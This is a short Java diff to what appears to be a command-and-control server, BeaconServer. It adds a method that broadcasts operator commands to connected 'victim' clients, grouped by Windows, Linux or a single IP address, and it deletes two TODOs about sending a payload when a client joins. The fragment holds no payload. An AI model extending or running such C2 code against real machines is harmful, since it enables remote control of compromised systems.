@@ -71,6 +71,30 @@ public class BeaconServer implements Runnable{
     }
 
     /**
+     * Distribute commands from the Beacon C2 Handler, to all of the different Beacon Client Handlers.
+     * 
+     * @param scope - What clients should receive the command
+     * @param command - what Command should be run
+     */
+    protected void distributeCommands(String scope, String command){
+        if(scope.equals("Windows")){
+            for(BeaconClientHandler clientHandler : windowsClientObjects.values()) {
+                clientHandler.sendToClient(command);
+            }
+        } else if(scope.equals("Linux")){
+            for(BeaconClientHandler clientHandler : linuxClientObjects.values()){
+                clientHandler.sendToClient(command);
+            }
+        } else {
+            if(windowsClientObjects.keySet().contains(scope)){
+                windowsClientObjects.get(scope).sendToClient(command);
+            } else if(linuxClientObjects.keySet().contains(scope)){
+                linuxClientObjects.get(scope).sendToClient(command);
+            }
+        }
+    }
+
+    /**
      * Add Responses from commands run on the C2 Victims to an ArrayList containing all of their responses
      * 
      * @param IPAddress the IP Address of the Client that the response came from
@@ -261,11 +285,9 @@ public class BeaconServer implements Runnable{
                 if(OSMessage.equals("Windows")){
                     windowsClientObjects.put(IPAddress,clientHandler);
                     windowsClientResponses.put(IPAddress, new ArrayList<String>());
-                    // TODO: Send Payload back on the client's initial join
                 }else if(OSMessage.equals("Linux")){
                     linuxClientObjects.put(IPAddress,clientHandler);
                     linuxClientResponses.put(IPAddress, new ArrayList<String>());
-                    // TODO: Send Payload back on the client's initial join
                 }
                 
             } catch(IOException e){
